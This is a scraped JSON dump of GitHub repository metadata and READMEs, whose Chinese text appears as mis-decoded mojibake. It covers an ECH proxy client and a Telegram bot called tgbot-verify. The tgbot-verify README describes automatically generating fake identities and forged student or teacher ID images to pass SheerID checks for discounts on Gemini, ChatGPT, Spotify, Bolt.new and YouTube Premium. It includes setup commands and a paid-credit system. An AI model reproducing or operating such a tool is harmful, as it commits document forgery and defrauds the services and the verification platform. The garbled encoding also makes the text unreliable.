      "readme": "# ECH Workers å®¢æˆ·ç«¯\n\n[![GitHub release](https://img.shields.io/github/release/byJoey/ech-wk.svg)](https://github.com/byJoey/ech-wk/releases)\n[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)\n\nè·¨å¹³å°çš„ ECH Workers ä»£ç†å®¢æˆ·ç«¯ï¼Œæ”¯æŒ Windowsã€macOS å’Œ Linuxï¼ˆARM/x86ï¼‰ï¼Œæä¾›å›¾å½¢ç•Œé¢å’Œå‘½ä»¤è¡Œä¸¤ç§ä½¿ç”¨æ–¹å¼ã€‚\n\n## ğŸ“‹ ç›®å½•\n\n- [åŠŸèƒ½ç‰¹æ€§](#åŠŸèƒ½ç‰¹æ€§)\n- [ç‰ˆæœ¬æ›´æ–°](#ç‰ˆæœ¬æ›´æ–°)\n- [å¿«é€Ÿå¼€å§‹](#å¿«é€Ÿå¼€å§‹)\n- [å‘½ä»¤è¡Œä½¿ç”¨](#å‘½ä»¤è¡Œä½¿ç”¨)\n- [å›¾å½¢ç•Œé¢ä½¿ç”¨](#å›¾å½¢ç•Œé¢ä½¿ç”¨)\n- [è½¯è·¯ç”±éƒ¨ç½²](#è½¯è·¯ç”±éƒ¨ç½²)\n- [ç³»ç»Ÿè¦æ±‚](#ç³»ç»Ÿè¦æ±‚)\n- [æ•…éšœæ’é™¤](#æ•…éšœæ’é™¤)\n- [æŠ€æœ¯æ–‡æ¡£](#æŠ€æœ¯æ–‡æ¡£)\n\n## âœ¨ åŠŸèƒ½ç‰¹æ€§\n\n### æ ¸å¿ƒåŠŸèƒ½\n- âœ… **ECH åŠ å¯†** - åŸºäº TLS 1.3 ECH (Encrypted Client Hello) æŠ€æœ¯ï¼ŒåŠ å¯† SNI ä¿¡æ¯\n- âœ… **å¤šåè®®æ”¯æŒ** - åŒæ—¶æ”¯æŒ SOCKS5 å’Œ HTTP CONNECT ä»£ç†åè®®\n- âœ… **æ™ºèƒ½åˆ†æµ** - ä¸‰ç§åˆ†æµæ¨¡å¼ï¼šå…¨å±€ä»£ç†ã€è·³è¿‡ä¸­å›½å¤§é™†ã€ç›´è¿æ¨¡å¼\n- âœ… **IPv4/IPv6 åŒæ ˆ** - å®Œæ•´æ”¯æŒ IPv4 å’Œ IPv6 åœ°å€çš„åˆ†æµåˆ¤æ–­\n\n### å›¾å½¢ç•Œé¢åŠŸèƒ½\n- âœ… **å¤šæœåŠ¡å™¨ç®¡ç†** - æ”¯æŒå¤šä¸ªæœåŠ¡å™¨é…ç½®ï¼Œå¿«é€Ÿåˆ‡æ¢\n- âœ… **ä¸€é”®ç³»ç»Ÿä»£ç†** - è‡ªåŠ¨è®¾ç½®ç³»ç»Ÿä»£ç†ï¼Œæ”¯æŒåˆ†æµæ¨¡å¼\n- âœ… **ç³»ç»Ÿæ‰˜ç›˜** - æœ€å°åŒ–åˆ°ç³»ç»Ÿæ‰˜ç›˜ï¼Œä¸å ç”¨ä»»åŠ¡æ \n- âœ… **å¼€æœºè‡ªå¯** - æ”¯æŒ Windows å’Œ macOS å¼€æœºè‡ªåŠ¨å¯åŠ¨\n- âœ… **é«˜ DPI æ”¯æŒ** - å®Œç¾æ”¯æŒé«˜åˆ†è¾¨ç‡æ˜¾ç¤ºå™¨\n- âœ… **å®æ—¶æ—¥å¿—** - æŸ¥çœ‹ä»£ç†è¿è¡ŒçŠ¶æ€å’Œæ—¥å¿—\n- âœ… **é…ç½®æŒä¹…åŒ–** - è‡ªåŠ¨ä¿å­˜é…ç½®ï¼Œä¸‹æ¬¡å¯åŠ¨è‡ªåŠ¨åŠ è½½\n\n### é«˜çº§åŠŸèƒ½\n- âœ… **è‡ªåŠ¨ IP åˆ—è¡¨æ›´æ–°** - è‡ªåŠ¨ä¸‹è½½å¹¶åº”ç”¨å®Œæ•´çš„ä¸­å›½ IP åˆ—è¡¨ï¼ˆIPv4/IPv6ï¼‰\n- âœ… **DNS ä¼˜é€‰** - æ”¯æŒè‡ªå®šä¹‰ DoH æœåŠ¡å™¨è¿›è¡Œ ECH æŸ¥è¯¢\n- âœ… **IP ç›´è¿** - æ”¯æŒæŒ‡å®šæœåŠ¡ç«¯ IPï¼Œç»•è¿‡ DNS è§£æ\n- âœ… **è·¨å¹³å°æ”¯æŒ** - Windowsã€macOSã€Linuxï¼ˆx86_64/ARM64ï¼‰\n\n## ğŸ†• ç‰ˆæœ¬æ›´æ–°\n\n### v1.3 æœ€æ–°ä¼˜åŒ–\n\n#### æ ¸å¿ƒåŠŸèƒ½å¢å¼º\n- **IPv6 å®Œæ•´æ”¯æŒ**\n  - æ–°å¢ IPv6 åœ°å€åˆ†æµåˆ¤æ–­åŠŸèƒ½\n  - è‡ªåŠ¨ä¸‹è½½å¹¶åŠ è½½ä¸­å›½ IPv6 IP åˆ—è¡¨ï¼ˆ`chn_ip_v6.txt`ï¼‰\n  - æ”¯æŒ IPv4/IPv6 åŒæ ˆç¯å¢ƒä¸‹çš„æ™ºèƒ½åˆ†æµ\n\n- **æ™ºèƒ½ IP åˆ—è¡¨ç®¡ç†**\n  - è‡ªåŠ¨æ£€æµ‹ IP åˆ—è¡¨æ–‡ä»¶æ˜¯å¦å­˜åœ¨æˆ–ä¸ºç©º\n  - æ–‡ä»¶ç¼ºå¤±æ—¶è‡ªåŠ¨ä» GitHub ä¸‹è½½æœ€æ–°åˆ—è¡¨\n  - æ”¯æŒ IPv4 å’Œ IPv6 åˆ—è¡¨çš„ç‹¬ç«‹ç®¡ç†\n  - åˆ—è¡¨æ¥æºï¼š[mayaxcn/china-ip-list](https://github.com/mayaxcn/china-ip-list)\n\n- **åˆ†æµé€»è¾‘ä¼˜åŒ–**\n  - åˆ†æµåˆ¤æ–­é€»è¾‘ç§»è‡³ Go æ ¸å¿ƒç¨‹åºï¼Œæ€§èƒ½æ›´ä¼˜\n  - æ”¯æŒåŸŸåè§£æåçš„å¤š IP åœ°å€åˆ¤æ–­\n  - æ”¹è¿›çš„äºŒåˆ†æŸ¥æ‰¾ç®—æ³•ï¼Œæå‡æŸ¥è¯¢æ•ˆç‡\n\n#### å‘½ä»¤è¡Œä½“éªŒæ”¹è¿›\n- **é»˜è®¤è¡Œä¸ºä¼˜åŒ–**\n  - å‘½ä»¤è¡Œæ¨¡å¼ä¸‹ï¼Œ`-routing` å‚æ•°é»˜è®¤å€¼æ”¹ä¸º `global`ï¼ˆå…¨å±€ä»£ç†ï¼‰\n  - æ›´ç¬¦åˆå‘½ä»¤è¡Œç”¨æˆ·çš„ä½¿ç”¨ä¹ æƒ¯\n  - GUI æ¨¡å¼ä¸å—å½±å“ï¼Œä»ä½¿ç”¨é…ç½®çš„é»˜è®¤å€¼\n\n- **å‚æ•°è¯´æ˜å®Œå–„**\n  - æ›´æ–°å¸®åŠ©ä¿¡æ¯ï¼Œæ˜ç¡®å„å‚æ•°çš„ä½œç”¨å’Œé»˜è®¤å€¼\n  - æ·»åŠ åˆ†æµæ¨¡å¼çš„è¯¦ç»†è¯´æ˜\n\n#### å…¼å®¹æ€§æå‡\n- **å‘åå…¼å®¹**\n  - ä¿æŒä¸æ—§ç‰ˆæœ¬é…ç½®æ–‡ä»¶çš„å…¼å®¹æ€§\n  - è‡ªåŠ¨è¿ç§»å’Œå‡çº§é…ç½®æ ¼å¼\n  - å¹³æ»‘å‡çº§ä½“éªŒ\n\n### å†å²ç‰ˆæœ¬\n\n#### v1.0\n- åˆå§‹ç‰ˆæœ¬å‘å¸ƒ\n- åŸºç¡€ä»£ç†åŠŸèƒ½\n- å›¾å½¢ç•Œé¢æ”¯æŒ\n- ç³»ç»Ÿä»£ç†è®¾ç½®\n\n## ğŸš€ å¿«é€Ÿå¼€å§‹\n\n### æ–¹æ³• 1: ä½¿ç”¨é¢„ç¼–è¯‘ç‰ˆæœ¬ï¼ˆæ¨èï¼‰\n\nä» [GitHub Releases](https://github.com/byJoey/ech-wk/releases) ä¸‹è½½å¯¹åº”å¹³å°çš„å‹ç¼©åŒ…ï¼š\n\n#### æ¡Œé¢ç‰ˆæœ¬ï¼ˆåŒ…å« GUIï¼‰\n- **Windows x64**: `ECHWorkers-windows-amd64.zip`\n- **macOS Intel**: `ECHWorkers-darwin-amd64.zip`\n- **macOS Apple Silicon**: `ECHWorkers-darwin-arm64.zip`\n- **Linux x86_64**: `ECHWorkers-linux-amd64.tar.gz`\n- **Linux ARM64**: `ECHWorkers-linux-arm64.tar.gz`\n\n#### è½¯è·¯ç”±ç‰ˆæœ¬ï¼ˆä»…å‘½ä»¤è¡Œï¼‰\n- **Linux x86_64**: `ECHWorkers-linux-amd64-softrouter.tar.gz`\n- **Linux ARM64**: `ECHWorkers-linux-arm64-softrouter.tar.gz`\n#### Dockerç‰ˆæœ¬ï¼ˆä»…æµ‹è¯•x86ï¼‰\n- **DockerHubä»“åº“**ï¼šhttps://hub.docker.com/r/cirnosalt/ech-workers-docker\n#### å®‰è£…æ­¥éª¤\n\n1. **è§£å‹æ–‡ä»¶**\n   ```bash\n   # Windows: è§£å‹åˆ°ä»»æ„ç›®å½•\n   # macOS/Linux: è§£å‹åˆ° /usr/local/bin æˆ–è‡ªå®šä¹‰ç›®å½•\n   tar -xzf ECHWorkers-linux-amd64.tar.gz\n   ```\n\n2. **è®¾ç½®æ‰§è¡Œæƒé™**ï¼ˆLinux/macOSï¼‰\n   ```bash\n   chmod +x ech-workers\n   chmod +x ECHWorkersGUI  # å¦‚æœä½¿ç”¨ GUI\n   ```\n\n3. **è¿è¡Œç¨‹åº**\n   - **Windows**: åŒå‡» `ECHWorkersGUI.exe` å¯åŠ¨ GUIï¼Œæˆ–è¿è¡Œ `ech-workers.exe` ä½¿ç”¨å‘½ä»¤è¡Œ\n   - **macOS/Linux**: è¿è¡Œ `./ECHWorkersGUI` å¯åŠ¨ GUIï¼Œæˆ–è¿è¡Œ `./ech-workers` ä½¿ç”¨å‘½ä»¤è¡Œ\n\n> **æ³¨æ„**: é¢„ç¼–è¯‘ç‰ˆæœ¬å·²åŒ…å«æ‰€æœ‰ä¾èµ–ï¼Œæ— éœ€å®‰è£… Python æˆ–ä»»ä½•å…¶ä»–è½¯ä»¶ã€‚  \n> é¦–æ¬¡è¿è¡Œ\"è·³è¿‡ä¸­å›½å¤§é™†\"æ¨¡å¼æ—¶ï¼Œç¨‹åºä¼šè‡ªåŠ¨ä¸‹è½½ IP åˆ—è¡¨æ–‡ä»¶ã€‚\n\n## ğŸ’» å‘½ä»¤è¡Œä½¿ç”¨\n\n`ech-workers` æ”¯æŒçº¯å‘½ä»¤è¡Œè¿è¡Œï¼Œé€‚åˆæœåŠ¡å™¨ç¯å¢ƒã€è½¯è·¯ç”±æˆ–æ— å›¾å½¢ç•Œé¢åœºæ™¯ã€‚\n\n### å‘½ä»¤è¯­æ³•\n\n```bash\nech-workers [é€‰é¡¹]\n```\n\n### å‚æ•°è¯´æ˜\n\n#### å¿…éœ€å‚æ•°\n\n| å‚æ•° | è¯´æ˜ | ç¤ºä¾‹ |\n|------|------|------|\n| `-f` | æœåŠ¡ç«¯åœ°å€ï¼ˆå¿…éœ€ï¼‰ | `-f your-worker.workers.dev:443` |\n\n#### å¯é€‰å‚æ•°\n\n| å‚æ•° | é»˜è®¤å€¼ | è¯´æ˜ | ç¤ºä¾‹ |\n|------|--------|------|------|\n| `-l` | `127.0.0.1:30000` | æœ¬åœ°ç›‘å¬åœ°å€ | `-l 0.0.0.0:30001` |\n| `-token` | ç©º | èº«ä»½éªŒè¯ä»¤ç‰Œ | `-token your-token-here` |\n| `-ip` | ç©º | æŒ‡å®šæœåŠ¡ç«¯ IPï¼ˆç»•è¿‡ DNSï¼‰ | `-ip 1.2.3.4` |\n| `-dns` | `dns.alidns.com/dns-query` | ECH æŸ¥è¯¢ DoH æœåŠ¡å™¨ | `-dns dns.alidns.com/dns-query` |\n| `-ech` | `cloudflare-ech.com` | ECH æŸ¥è¯¢åŸŸå | `-ech cloudflare-ech.com` |\n| `-routing` | `global` | åˆ†æµæ¨¡å¼ | `-routing bypass_cn` |\n\n#### åˆ†æµæ¨¡å¼è¯´æ˜\n\n| æ¨¡å¼ | å€¼ | è¯´æ˜ |\n|------|-----|------|\n| **å…¨å±€ä»£ç†** | `global` | æ‰€æœ‰æµé‡éƒ½èµ°ä»£ç†ï¼ˆé»˜è®¤æ¨¡å¼ï¼‰ |\n| **è·³è¿‡ä¸­å›½å¤§é™†** | `bypass_cn` | ä¸­å›½ IP ç›´è¿ï¼Œå…¶ä»–èµ°ä»£ç† |\n| **ç›´è¿æ¨¡å¼** | `none` | æ‰€æœ‰æµé‡ç›´è¿ï¼Œä¸è®¾ç½®ä»£ç† |\n\n> **æ³¨æ„**: \n> - ä½¿ç”¨ `bypass_cn` æ¨¡å¼æ—¶ï¼Œç¨‹åºä¼šè‡ªåŠ¨ä¸‹è½½ä¸­å›½ IP åˆ—è¡¨ï¼ˆIPv4/IPv6ï¼‰\n> - å¦‚æœ IP åˆ—è¡¨æ–‡ä»¶ä¸å­˜åœ¨æˆ–ä¸ºç©ºï¼Œç¨‹åºä¼šè‡ªåŠ¨ä» GitHub ä¸‹è½½\n> - IP åˆ—è¡¨æ–‡ä»¶ä¿å­˜åœ¨ç¨‹åºç›®å½•ï¼š`chn_ip.txt`ï¼ˆIPv4ï¼‰å’Œ `chn_ip_v6.txt`ï¼ˆIPv6ï¼‰\n\n### ä½¿ç”¨ç¤ºä¾‹\n\n#### åŸºæœ¬ç”¨æ³•\n\n```bash\n# Windows\nech-workers.exe -f your-worker.workers.dev:443\n\n# macOS / Linux\n./ech-workers -f your-worker.workers.dev:443\n```\n\n#### æŒ‡å®šç›‘å¬åœ°å€\n\n```bash\n# ç›‘å¬æ‰€æœ‰ç½‘ç»œæ¥å£ï¼ˆé€‚åˆè½¯è·¯ç”±ï¼‰\n./ech-workers -f your-worker.workers.dev:443 -l 0.0.0.0:30001\n\n# ä»…ç›‘å¬æœ¬åœ°ï¼ˆé»˜è®¤ï¼‰\n./ech-workers -f your-worker.workers.dev:443 -l 127.0.0.1:30001\n```\n\n#### ä½¿ç”¨åˆ†æµæ¨¡å¼\n\n```bash\n# å…¨å±€ä»£ç†æ¨¡å¼ï¼ˆé»˜è®¤ï¼‰\n./ech-workers -f your-worker.workers.dev:443 -routing global\n\n# è·³è¿‡ä¸­å›½å¤§é™†æ¨¡å¼ï¼ˆè‡ªåŠ¨ä¸‹è½½ IP åˆ—è¡¨ï¼‰\n./ech-workers -f your-worker.workers.dev:443 -routing bypass_cn\n\n# ç›´è¿æ¨¡å¼\n./ech-workers -f your-worker.workers.dev:443 -routing none\n```\n\n#### å®Œæ•´å‚æ•°ç¤ºä¾‹\n\n```bash\n./ech-workers \\\n  -f your-worker.workers.dev:443 \\\n  -l 0.0.0.0:30001 \\\n  -token your-token \\\n  -ip saas.sin.fan \\\n  -dns dns.alidns.com/dns-query \\\n  -ech cloudflare-ech.com \\\n  -routing bypass_cn\n```\n\n#### æŸ¥çœ‹å¸®åŠ©\n\n```bash\n./ech-workers -h\n# æˆ–\n./ech-workers --help\n```\n\n### åå°è¿è¡Œ\n\n#### Linux/macOS\n\n**ä½¿ç”¨ nohup:**\n```bash\nnohup ./ech-workers -f your-worker.workers.dev:443 -l 127.0.0.1:30001 > ech-workers.log 2>&1 &\n```\n\n**ä½¿ç”¨ screen:**\n```bash\nscreen -S ech-work",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-21T02:54:38.895839"
  },
  {
    "basic_info": {
      "name": "tgbot-verify",
      "full_name": "PastKing/tgbot-verify",
      "owner": "PastKing",
      "description": "ä¸€ä¸ªåŸºäº Python Telegram Bot çš„è‡ªåŠ¨åŒ–è®¤è¯å·¥å…·ï¼Œèƒ½å¤Ÿè‡ªåŠ¨å®Œæˆ SheerID å¹³å°çš„å­¦ç”Ÿ/æ•™å¸ˆèº«ä»½éªŒè¯æµç¨‹ã€‚",
      "url": "https://github.com/PastKing/tgbot-verify",
      "clone_url": "https://github.com/PastKing/tgbot-verify.git",
      "ssh_url": "git@github.com:PastKing/tgbot-verify.git",
      "homepage": null,
      "created_at": "2025-12-07T06:27:57Z",
      "updated_at": "2025-12-21T02:33:41Z",
      "pushed_at": "2025-12-13T04:02:17Z"
    },
    "stats": {
      "stars": 1396,
      "forks": 510,
      "watchers": 1396,
      "open_issues": 3,
      "size": 92
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 220635,
        "HTML": 9190,
        "Dockerfile": 1609
      },
      "license": "MIT License",
      "topics": []
    },
    "content": {
      "readme": "# SheerID è‡ªåŠ¨è®¤è¯ Telegram æœºå™¨äºº\n\n![Stars](https://img.shields.io/github/stars/PastKing/tgbot-verify?style=social)\n![Forks](https://img.shields.io/github/forks/PastKing/tgbot-verify?style=social)\n![Issues](https://img.shields.io/github/issues/PastKing/tgbot-verify)\n![License](https://img.shields.io/github/license/PastKing/tgbot-verify)\n\n> ğŸ¤– è‡ªåŠ¨å®Œæˆ SheerID å­¦ç”Ÿ/æ•™å¸ˆè®¤è¯çš„ Telegram æœºå™¨äºº\n> \n> åŸºäº [@auto_sheerid_bot](https://t.me/auto_sheerid_bot) GGBond çš„æ—§ç‰ˆä»£ç æ”¹è¿›\n\n---\n\n## ğŸ“‹ é¡¹ç›®ç®€ä»‹\n\nè¿™æ˜¯ä¸€ä¸ªåŸºäº Python çš„ Telegram æœºå™¨äººï¼Œå¯ä»¥è‡ªåŠ¨å®Œæˆå¤šä¸ªå¹³å°çš„ SheerID å­¦ç”Ÿ/æ•™å¸ˆèº«ä»½è®¤è¯ã€‚æœºå™¨äººè‡ªåŠ¨ç”Ÿæˆèº«ä»½ä¿¡æ¯ã€åˆ›å»ºè®¤è¯æ–‡æ¡£å¹¶æäº¤åˆ° SheerID å¹³å°ï¼Œå¤§å¤§ç®€åŒ–äº†è®¤è¯æµç¨‹ã€‚\n\n### ğŸ¯ æ”¯æŒçš„è®¤è¯æœåŠ¡\n\n| å‘½ä»¤ | æœåŠ¡ | ç±»å‹ | çŠ¶æ€ | è¯´æ˜ |\n|------|------|------|------|------|\n| `/verify` | Gemini One Pro | æ•™å¸ˆè®¤è¯ | âœ… å®Œæ•´ | Google AI Studio æ•™è‚²ä¼˜æƒ  |\n| `/verify2` | ChatGPT Teacher K12 | æ•™å¸ˆè®¤è¯ | âœ… å®Œæ•´ | OpenAI ChatGPT æ•™è‚²ä¼˜æƒ  |\n| `/verify3` | Spotify Student | å­¦ç”Ÿè®¤è¯ | âœ… å®Œæ•´ | Spotify å­¦ç”Ÿè®¢é˜…ä¼˜æƒ  |\n| `/verify4` | Bolt.new Teacher | æ•™å¸ˆè®¤è¯ | âœ… å®Œæ•´ | Bolt.new æ•™è‚²ä¼˜æƒ ï¼ˆè‡ªåŠ¨è·å– codeï¼‰|\n| `/verify5` | YouTube Premium Student | å­¦ç”Ÿè®¤è¯ | âš ï¸ åŠæˆå“ | YouTube Premium å­¦ç”Ÿä¼˜æƒ ï¼ˆè§ä¸‹æ–¹è¯´æ˜ï¼‰|\n\n> **âš ï¸ YouTube è®¤è¯ç‰¹åˆ«è¯´æ˜**ï¼š\n> \n> YouTube è®¤è¯åŠŸèƒ½ç›®å‰ä¸ºåŠæˆå“çŠ¶æ€ï¼Œä½¿ç”¨å‰è¯·ä»”ç»†é˜…è¯» [`youtube/HELP.MD`](youtube/HELP.MD) æ–‡æ¡£ã€‚\n> \n> **ä¸»è¦åŒºåˆ«**ï¼š\n> - YouTube çš„åŸå§‹é“¾æ¥æ ¼å¼ä¸å…¶ä»–æœåŠ¡ä¸åŒ\n> - éœ€è¦æ‰‹åŠ¨ä»æµè§ˆå™¨ç½‘ç»œæ—¥å¿—ä¸­æå– `programId` å’Œ `verificationId`\n> - ç„¶åæ‰‹åŠ¨ç»„æˆæ ‡å‡†çš„ SheerID é“¾æ¥æ ¼å¼\n> \n> **ä½¿ç”¨æ­¥éª¤**ï¼š\n> 1. è®¿é—® YouTube Premium å­¦ç”Ÿè®¤è¯é¡µé¢\n> 2. æ‰“å¼€æµè§ˆå™¨å¼€å‘è€…å·¥å…·ï¼ˆF12ï¼‰â†’ ç½‘ç»œï¼ˆNetworkï¼‰æ ‡ç­¾\n> 3. å¼€å§‹è®¤è¯æµç¨‹ï¼Œæœç´¢ `https://services.sheerid.com/rest/v2/verification/`\n> 4. ä»è¯·æ±‚è½½è·ä¸­è·å– `programId`ï¼Œä»å“åº”ä¸­è·å– `verificationId`\n> 5. æ‰‹åŠ¨ç»„æˆé“¾æ¥ï¼š`https://services.sheerid.com/verify/{programId}/?verificationId={verificationId}`\n> 6. ä½¿ç”¨ `/verify5` å‘½ä»¤æäº¤è¯¥é“¾æ¥\n\n### âœ¨ æ ¸å¿ƒåŠŸèƒ½\n\n- ğŸš€ **è‡ªåŠ¨åŒ–æµç¨‹**ï¼šä¸€é”®å®Œæˆä¿¡æ¯ç”Ÿæˆã€æ–‡æ¡£åˆ›å»ºã€è®¤è¯æäº¤\n- ğŸ¨ **æ™ºèƒ½ç”Ÿæˆ**ï¼šè‡ªåŠ¨ç”Ÿæˆå­¦ç”Ÿè¯/æ•™å¸ˆè¯ PNG å›¾ç‰‡\n- ğŸ’° **ç§¯åˆ†ç³»ç»Ÿ**ï¼šç­¾åˆ°ã€é‚€è¯·ã€å¡å¯†å…‘æ¢ç­‰å¤šç§è·å–æ–¹å¼\n- ğŸ” **å®‰å…¨å¯é **ï¼šä½¿ç”¨ MySQL æ•°æ®åº“ï¼Œæ”¯æŒç¯å¢ƒå˜é‡é…ç½®\n- âš¡ **å¹¶å‘æ§åˆ¶**ï¼šæ™ºèƒ½ç®¡ç†å¹¶å‘è¯·æ±‚ï¼Œç¡®ä¿ç¨³å®šæ€§\n- ğŸ‘¥ **ç®¡ç†åŠŸèƒ½**ï¼šå®Œå–„çš„ç”¨æˆ·ç®¡ç†å’Œç§¯åˆ†ç®¡ç†ç³»ç»Ÿ\n\n---\n\n## ğŸ› ï¸ æŠ€æœ¯æ ˆ\n\n- **è¯­è¨€**ï¼šPython 3.11+\n- **Botæ¡†æ¶**ï¼špython-telegram-bot 20.0+\n- **æ•°æ®åº“**ï¼šMySQL 5.7+\n- **æµè§ˆå™¨è‡ªåŠ¨åŒ–**ï¼šPlaywright\n- **HTTPå®¢æˆ·ç«¯**ï¼šhttpx\n- **å›¾åƒå¤„ç†**ï¼šPillow, reportlab, xhtml2pdf\n- **ç¯å¢ƒç®¡ç†**ï¼špython-dotenv\n\n---\n\n## ğŸš€ å¿«é€Ÿå¼€å§‹\n\n### 1. å…‹éš†é¡¹ç›®\n\n```bash\ngit clone https://github.com/PastKing/tgbot-verify.git\ncd tgbot-verify\n```\n\n### 2. å®‰è£…ä¾èµ–\n\n```bash\npip install -r requirements.txt\nplaywright install chromium\n```\n\n### 3. é…ç½®ç¯å¢ƒå˜é‡\n\nå¤åˆ¶ `env.example` ä¸º `.env` å¹¶å¡«å†™é…ç½®ï¼š\n\n```env\n# Telegram Bot é…ç½®\nBOT_TOKEN=your_bot_token_here\nCHANNEL_USERNAME=your_channel\nCHANNEL_URL=https://t.me/your_channel\nADMIN_USER_ID=your_admin_id\n\n# MySQL æ•°æ®åº“é…ç½®\nMYSQL_HOST=localhost\nMYSQL_PORT=3306\nMYSQL_USER=root\nMYSQL_PASSWORD=your_password\nMYSQL_DATABASE=tgbot_verify\n```\n\n### 4. å¯åŠ¨æœºå™¨äºº\n\n```bash\npython bot.py\n```\n\n---\n\n## ğŸ³ Docker éƒ¨ç½²\n\n### ä½¿ç”¨ Docker Composeï¼ˆæ¨èï¼‰\n\n```bash\n# 1. ä¿®æ”¹ .env æ–‡ä»¶é…ç½®\ncp env.example .env\nnano .env\n\n# 2. å¯åŠ¨æœåŠ¡\ndocker-compose up -d\n\n# 3. æŸ¥çœ‹æ—¥å¿—\ndocker-compose logs -f\n```\n\n### æ‰‹åŠ¨ Docker éƒ¨ç½²\n\n```bash\n# æ„å»ºé•œåƒ\ndocker build -t tgbot-verify .\n\n# è¿è¡Œå®¹å™¨\ndocker run -d \\\n  --name tgbot-verify \\\n  --env-file .env \\\n  -v $(pwd)/logs:/app/logs \\\n  tgbot-verify\n```\n\n---\n\n## ğŸ“– ä½¿ç”¨è¯´æ˜\n\n### ç”¨æˆ·å‘½ä»¤\n\n```bash\n/start              # å¼€å§‹ä½¿ç”¨ï¼ˆæ³¨å†Œï¼‰\n/about              # äº†è§£æœºå™¨äººåŠŸèƒ½\n/balance            # æŸ¥çœ‹ç§¯åˆ†ä½™é¢\n/qd                 # æ¯æ—¥ç­¾åˆ°ï¼ˆ+1ç§¯åˆ†ï¼‰\n/invite             # ç”Ÿæˆé‚€è¯·é“¾æ¥ï¼ˆ+2ç§¯åˆ†/äººï¼‰\n/use <å¡å¯†>         # ä½¿ç”¨å¡å¯†å…‘æ¢ç§¯åˆ†\n/verify <é“¾æ¥>      # Gemini One Pro è®¤è¯\n/verify2 <é“¾æ¥>     # ChatGPT Teacher K12 è®¤è¯\n/verify3 <é“¾æ¥>     # Spotify Student è®¤è¯\n/verify4 <é“¾æ¥>     # Bolt.new Teacher è®¤è¯\n/verify5 <é“¾æ¥>     # YouTube Premium Student è®¤è¯\n/getV4Code <id>     # è·å– Bolt.new è®¤è¯ç \n/help               # æŸ¥çœ‹å¸®åŠ©ä¿¡æ¯\n```\n\n### ç®¡ç†å‘˜å‘½ä»¤\n\n```bash\n/addbalance <ç”¨æˆ·ID> <ç§¯åˆ†>     # å¢åŠ ç”¨æˆ·ç§¯åˆ†\n/block <ç”¨æˆ·ID>                 # æ‹‰é»‘ç”¨æˆ·\n/white <ç”¨æˆ·ID>                 # å–æ¶ˆæ‹‰é»‘\n/blacklist                      # æŸ¥çœ‹é»‘åå•\n/genkey <å¡å¯†> <ç§¯åˆ†> [æ¬¡æ•°] [å¤©æ•°]  # ç”Ÿæˆå¡å¯†\n/listkeys                       # æŸ¥çœ‹å¡å¯†åˆ—è¡¨\n/broadcast <æ–‡æœ¬>               # ç¾¤å‘é€šçŸ¥\n```\n\n### ä½¿ç”¨æµç¨‹\n\n1. **è·å–è®¤è¯é“¾æ¥**\n   - è®¿é—®å¯¹åº”æœåŠ¡çš„è®¤è¯é¡µé¢\n   - å¼€å§‹è®¤è¯æµç¨‹\n   - å¤åˆ¶æµè§ˆå™¨åœ°å€æ ä¸­çš„å®Œæ•´ URLï¼ˆåŒ…å« `verificationId`ï¼‰\n\n2. **æäº¤è®¤è¯è¯·æ±‚**\n   ```\n   /verify3 https://services.sheerid.com/verify/xxx/?verificationId=yyy\n   ```\n\n3. **ç­‰å¾…å¤„ç†**\n   - æœºå™¨äººè‡ªåŠ¨ç”Ÿæˆèº«ä»½ä¿¡æ¯\n   - åˆ›å»ºå­¦ç”Ÿè¯/æ•™å¸ˆè¯å›¾ç‰‡\n   - æäº¤åˆ° SheerID å¹³å°\n\n4. **è·å–ç»“æœ**\n   - å®¡æ ¸é€šå¸¸åœ¨å‡ åˆ†é’Ÿå†…å®Œæˆ\n   - æˆåŠŸåä¼šè¿”å›è·³è½¬é“¾æ¥\n\n---\n\n## ğŸ“ é¡¹ç›®ç»“æ„\n\n```\ntgbot-verify/\nâ”œâ”€â”€ bot.py                  # æœºå™¨äººä¸»ç¨‹åº\nâ”œâ”€â”€ config.py               # å…¨å±€é…ç½®\nâ”œâ”€â”€ database_mysql.py       # MySQL æ•°æ®åº“ç®¡ç†\nâ”œâ”€â”€ .env                    # ç¯å¢ƒå˜é‡é…ç½®ï¼ˆéœ€è‡ªè¡Œåˆ›å»ºï¼‰\nâ”œâ”€â”€ env.example             # ç¯å¢ƒå˜é‡æ¨¡æ¿\nâ”œâ”€â”€ requirements.txt        # Python ä¾èµ–\nâ”œâ”€â”€ Dockerfile              # Docker é•œåƒæ„å»º\nâ”œâ”€â”€ docker-compose.yml      # Docker Compose é…ç½®\nâ”œâ”€â”€ handlers/               # å‘½ä»¤å¤„ç†å™¨\nâ”‚   â”œâ”€â”€ user_commands.py    # ç”¨æˆ·å‘½ä»¤\nâ”‚   â”œâ”€â”€ admin_commands.py   # ç®¡ç†å‘˜å‘½ä»¤\nâ”‚   â””â”€â”€ verify_commands.py  # è®¤è¯å‘½ä»¤\nâ”œâ”€â”€ one/                    # Gemini One Pro è®¤è¯æ¨¡å—\nâ”œâ”€â”€ k12/                    # ChatGPT K12 è®¤è¯æ¨¡å—\nâ”œâ”€â”€ spotify/                # Spotify Student è®¤è¯æ¨¡å—\nâ”œâ”€â”€ youtube/                # YouTube Premium è®¤è¯æ¨¡å—\nâ”œâ”€â”€ Boltnew/                # Bolt.new è®¤è¯æ¨¡å—\nâ””â”€â”€ utils/                  # å·¥å…·å‡½æ•°\n    â”œâ”€â”€ messages.py         # æ¶ˆæ¯æ¨¡æ¿\n    â”œâ”€â”€ concurrency.py      # å¹¶å‘æ§åˆ¶\n    â””â”€â”€ checks.py           # æƒé™æ£€æŸ¥\n```\n\n---\n\n## âš™ï¸ é…ç½®è¯´æ˜\n\n### ç¯å¢ƒå˜é‡\n\n| å˜é‡å | å¿…å¡« | è¯´æ˜ | é»˜è®¤å€¼ |\n|--------|------|------|--------|\n| `BOT_TOKEN` | âœ… | Telegram Bot",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-21T02:54:40.016731"
  },
  {
    "basic_info": {
      "name": "ui-ux-pro-max-skill",
      "full_name": "nextlevelbuilder/ui-ux-pro-max-skill",
      "owner": "nextlevelbuilder",
      "description": "An AI SKILL that provide design intelligence for building professional UI/UX multiple platforms",
      "url": "https://github.com/nextlevelbuilder/ui-ux-pro-max-skill",
      "clone_url": "https://github.com/nextlevelbuilder/ui-ux-pro-max-skill.git",
